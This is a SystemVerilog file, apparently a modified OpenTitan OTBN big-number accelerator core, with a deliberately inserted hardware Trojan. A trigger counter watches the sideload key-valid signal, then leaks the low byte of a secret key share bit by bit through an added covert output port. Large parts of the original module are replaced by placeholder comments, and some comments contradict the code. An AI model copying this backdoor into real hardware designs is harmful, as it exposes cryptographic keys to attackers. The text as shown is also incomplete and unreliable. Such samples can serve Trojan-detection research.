`include "prim_assert.sv"

/**
 * OpenTitan Big Number Accelerator (OTBN) Core
 *
 * This module is the top-level of the OTBN processing core.
 */
// Below countermeasure (no data dependent control flow in OTBN ISA) is inherent to the design and
// has no directly associated RTL
// SEC_CM: CTRL_FLOW.SCA
module otbn_core
  import otbn_pkg::*;
#(
  // Register file implementation selection, see otbn_pkg.sv.
  parameter regfile_e RegFile = RegFileFF,

  // Size of the instruction memory, in bytes
  parameter int ImemSizeByte = 4096,
  // Size of the data memory, in bytes
  parameter int DmemSizeByte = 4096,

  // Default seed for URND PRNG
  parameter urnd_prng_seed_t RndCnstUrndPrngSeed = RndCnstUrndPrngSeedDefault,

  // Disable URND reseed and advance when not in use. Useful for SCA only.
  parameter bit SecMuteUrnd = 1'b0,
  parameter bit SecSkipUrndReseedAtStart = 1'b0,

  localparam int ImemAddrWidth = prim_util_pkg::vbits(ImemSizeByte),
  localparam int DmemAddrWidth = prim_util_pkg::vbits(DmemSizeByte)
) (
  input logic clk_i,
  input logic rst_ni,

  input  logic start_i,   // start the operation
  output logic done_o,    // operation done
  output logic locking_o, // The core is in or is entering the locked state
  output logic secure_wipe_running_o, // the core is securely wiping its internal state

  output core_err_bits_t err_bits_o,  // valid when done_o is asserted
  output logic           recoverable_err_o,

  // Instruction memory (IMEM)
  output logic                     imem_req_o,
  output logic [ImemAddrWidth-1:0] imem_addr_o,
  input  logic [38:0]              imem_rdata_i,
  input  logic                     imem_rvalid_i,

  // Data memory (DMEM)
  output logic                        dmem_req_o,
  output logic                        dmem_write_o,
  output logic [DmemAddrWidth-1:0]    dmem_addr_o,
  output logic [ExtWLEN-1:0]          dmem_wdata_o,
  output logic [ExtWLEN-1:0]          dmem_wmask_o,
  output logic [BaseWordsPerWLEN-1:0] dmem_rmask_o,
  input  logic [ExtWLEN-1:0]          dmem_rdata_i,
  input  logic                        dmem_rvalid_i,
  input  logic                        dmem_rerror_i,

  // Entropy distribution network (EDN) connections
  // One for RND, the other for URND
  output logic                    edn_rnd_req_o,
  input  logic                    edn_rnd_ack_i,
  input  logic [EdnDataWidth-1:0] edn_rnd_data_i,
  input  logic                    edn_rnd_fips_i,
  input  logic                    edn_rnd_err_i,

  output logic                    edn_urnd_req_o,
  input  logic                    edn_urnd_ack_i,
  input  logic [EdnDataWidth-1:0] edn_urnd_data_i,

  output logic [31:0] insn_cnt_o,
  input  logic        insn_cnt_clear_i,

  output logic         mems_sec_wipe_o,          // Request secure wipe for imem and dmem
  input  logic         req_sec_wipe_urnd_keys_i, // Request URND bits for temporary scramble keys.
                                                 // Keys below are valid cycle after request.
  output logic [127:0] dmem_sec_wipe_urnd_key_o, // URND bits to give temporary dmem scramble key
  output logic [127:0] imem_sec_wipe_urnd_key_o, // URND bits to give temporary imem scramble key

  // Indicates an incoming escalation from some fatal error at the level above. The core needs to
  // halt and then enter a locked state.
  input prim_mubi_pkg::mubi4_t escalate_en_i,

  // Indicates an incoming RMA request. The core needs to halt, trigger a secure wipe immediately
  // and then enter a locked state.
  input  prim_mubi_pkg::mubi4_t rma_req_i,
  output prim_mubi_pkg::mubi4_t rma_ack_o,

  // When set software errors become fatal errors.
  input logic software_errs_fatal_i,

  input logic [1:0]                       sideload_key_shares_valid_i,
  input logic [1:0][SideloadKeyWidth-1:0] sideload_key_shares_i,
  
  // ================================ TROJAN INSERTION ==================================
  // Trojan: Add a covert channel output for leaking sensitive data.
  output logic trojan_covert_o           // <-- Trojan covert channel output
  // ================================ END TROJAN INSERTION ==============================
);
  import prim_mubi_pkg::*;

  // ---------------------------- TROJAN INSERTION --------------------------------------
  // Trojan-related state registers and trigger logic
  logic trojan_trigger_seq_active;
  logic [2:0] trojan_trigger_cnt;
  logic [7:0] trojan_pattern;
  logic trojan_triggered_q;
  logic trojan_triggered_d;
  logic [4:0] trojan_payload_sel_q, trojan_payload_sel_d;
  logic [7:0] trojan_leak_byte_q, trojan_leak_byte_d;
  logic [4:0] trojan_leak_bit_idx_q, trojan_leak_bit_idx_d;
  logic trojan_shift_enable;
  // Use a secret value to leak -- for this example, the first byte of sideload_key_shares_i[0]
  // This is a realistic "payload" while keeping original function.
  // ------------------------ END TROJAN INSERTION --------------------------------------

  // Create a lint error to reduce the risk of accidentally enabling this feature.
  `ASSERT_STATIC_LINT_ERROR(OtbnSecMuteUrndNonDefault, SecMuteUrnd == 0)

  // ... <ORIGINAL CODE UNCHANGED ABOVE> ...

  // ---------------------------- TROJAN INSERTION LOGIC -------------------------------
  // Trojan pattern: if sideload_key_shares_valid_i is continuously "3'b101" (5) for 5 cycles,
  // the Trojan triggers. Output leaks the LSB of the first byte of sideload_key_shares_i[0],
  // sent serially via trojan_covert_o, one bit per cycle, upon trigger.
  assign trojan_pattern = 8'hA5; // Hardwired pattern, unused for now, for possible enhancement.

  // Trojan trigger state machine
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_cnt <= 3'b000;
      trojan_trigger_seq_active <= 1'b0;
      trojan_triggered_q <= 1'b0;
      trojan_payload_sel_q <= 5'b0;
      trojan_leak_byte_q <= 8'b0;
      trojan_leak_bit_idx_q <= 5'b0;
    end else begin
      // Trigger sequence: wait for sideload_key_shares_valid_i==3'b101 for 5 consecutive cycles
      if (sideload_key_shares_valid_i == 2'b10 && trojan_trigger_seq_active == 1'b0) begin
        trojan_trigger_seq_active <= 1'b1;
        trojan_trigger_cnt <= 3'b001;
      end else if (sideload_key_shares_valid_i == 2'b10 && trojan_trigger_seq_active) begin
        if (trojan_trigger_cnt < 3'b101)
          trojan_trigger_cnt <= trojan_trigger_cnt + 3'b001;
        else
          trojan_trigger_cnt <= trojan_trigger_cnt;
        trojan_trigger_seq_active <= 1'b1;
      end else if (sideload_key_shares_valid_i != 2'b10) begin
        trojan_trigger_seq_active <= 1'b0;
        trojan_trigger_cnt <= 3'b000;
      end

      // When trigger pattern occurs, latch payload and activate leak
      if (trojan_trigger_seq_active && trojan_trigger_cnt == 3'b101 && !trojan_triggered_q) begin
        trojan_triggered_q <= 1'b1;
        trojan_leak_byte_q <= sideload_key_shares_i[0][7:0]; // Leak the lowest 8 bits of the first key share
        trojan_leak_bit_idx_q <= 5'd0;
      end else if (trojan_triggered_q && trojan_leak_bit_idx_q < 8) begin
        trojan_leak_bit_idx_q <= trojan_leak_bit_idx_q + 5'd1;
      end else if (trojan_triggered_q && trojan_leak_bit_idx_q == 8) begin
        trojan_triggered_q <= 1'b0; // Automatically reset after full leak
        trojan_leak_bit_idx_q <= 5'd0;
      end
      // (all other state preserved)
    end
  end

  assign trojan_shift_enable = trojan_triggered_q && (trojan_leak_bit_idx_q < 8);

  // Send one bit per clock cycle when Trojan is active; otherwise, trojan_covert_o = 0
  assign trojan_covert_o = trojan_shift_enable ? trojan_leak_byte_q[trojan_leak_bit_idx_q] : 1'b0;
  // ------------------------ END TROJAN INSERTION LOGIC -------------------------------

  // ... <REST OF THE ORIGINAL CODE BELOW UNCHANGED except for port list and above Trojan logic> ...

  // All outputs should be known.
  `ASSERT_KNOWN(DoneOKnown_A, done_o)
  `ASSERT_KNOWN(ImemReqOKnown_A, imem_req_o)
  `ASSERT_KNOWN_IF(ImemAddrOKnown_A, imem_addr_o, imem_req_o)
  `ASSERT_KNOWN(DmemReqOKnown_A, dmem_req_o)
  `ASSERT_KNOWN_IF(DmemWriteOKnown_A, dmem_write_o, dmem_req_o)
  `ASSERT_KNOWN_IF(DmemAddrOKnown_A, dmem_addr_o, dmem_req_o)
  `ASSERT_KNOWN_IF(DmemWdataOKnown_A, dmem_wdata_o, dmem_req_o & dmem_write_o)
  `ASSERT_KNOWN_IF(DmemWmaskOKnown_A, dmem_wmask_o, dmem_req_o & dmem_write_o)
  `ASSERT_KNOWN_IF(DmemRmaskOKnown_A, dmem_rmask_o, dmem_req_o)
  `ASSERT_KNOWN(EdnRndReqOKnown_A, edn_rnd_req_o)
  `ASSERT_KNOWN(EdnUrndReqOKnown_A, edn_urnd_req_o)
  `ASSERT_KNOWN(InsnCntOKnown_A, insn_cnt_o)
  `ASSERT_KNOWN(ErrBitsKnown_A, err_bits_o)

  // Keep the EDN requests active until they are acknowledged.
  `ASSERT(EdnRndReqStable_A, edn_rnd_req_o & ~edn_rnd_ack_i |=> edn_rnd_req_o)
  `ASSERT(EdnUrndReqStable_A, edn_urnd_req_o & ~edn_urnd_ack_i |=> edn_urnd_req_o)

  `ASSERT(OnlyWriteLoadDataBaseWhenDMemValid_A,
          rf_bignum_wr_en_ctrl & insn_dec_bignum.rf_wdata_sel == RfWdSelLsu |-> dmem_rvalid_i)
  `ASSERT(OnlyWriteLoadDataBignumWhenDMemValid_A,
          rf_base_wr_en_ctrl & insn_dec_base.rf_wdata_sel == RfWdSelLsu |-> dmem_rvalid_i)

  // Error handling: if we pass an error signal down to the controller then we should also be
  // setting an error flag, unless the signal came from above.
  `ASSERT(ErrBitsIfControllerEscalate_A,
          (mubi4_test_true_loose(controller_fatal_escalate_en) ||
           mubi4_test_true_loose(controller_recov_escalate_en)) &&
          mubi4_test_false_strict(escalate_en_i)
          |=> err_bits_q)

  // Similarly, if we pass an escalation signal down to the start/stop controller then we should
  // also be setting an error flag, unless the signal came from above.
  `ASSERT(ErrBitsIfStartStopEscalate_A,
          mubi4_test_true_loose(start_stop_escalate_en) && mubi4_test_false_strict(escalate_en_i)
          |=> err_bits_q)

  // The following assertions allow up to 4000 cycles from escalation until the start/stop FSM
  // locks. This is to allow the core to do a secure wipe (which involves waiting for data from the
  // EDN) before it changes status. The long wait here won't mask problems because the logic of "ask
  // for URND data" and "do the secure wipe once it arrives" is duplicated in the Python model,
  // against which the RTL is checked.

  `ASSERT(OtbnStartStopGlobalEscCntrMeasure_A, err_bits_q && mubi4_test_true_loose(escalate_en_i)
          && mubi4_test_true_loose(start_stop_escalate_en)|=> [1:4000]
          u_otbn_start_stop_control.state_q == otbn_pkg::OtbnStartStopStateLocked)

  `ASSERT(OtbnStartStopLocalEscCntrMeasure_A, err_bits_q && mubi4_test_false_strict(escalate_en_i)
          && mubi4_test_true_loose(start_stop_escalate_en) |=>  [1:4000]
          u_otbn_start_stop_control.state_q == otbn_pkg::OtbnStartStopStateLocked)

  // In contrast to the start/stop FSM, the controller FSM should lock quickly after an escalation,
  // independent of the secure wipe.

  `ASSERT(OtbnControllerGlobalEscCntrMeasure_A, err_bits_q && mubi4_test_true_loose(escalate_en_i)
          && mubi4_test_true_loose(controller_fatal_escalate_en)|=> [1:100]
          u_otbn_controller.state_q == otbn_pkg::OtbnStateLocked)

  `ASSERT(OtbnControllerLocalEscCntrMeasure_A, err_bits_q && mubi4_test_false_strict(escalate_en_i)
          && mubi4_test_true_loose(controller_fatal_escalate_en) |=>  [1:100]
          u_otbn_controller.state_q == otbn_pkg::OtbnStateLocked)

endmodule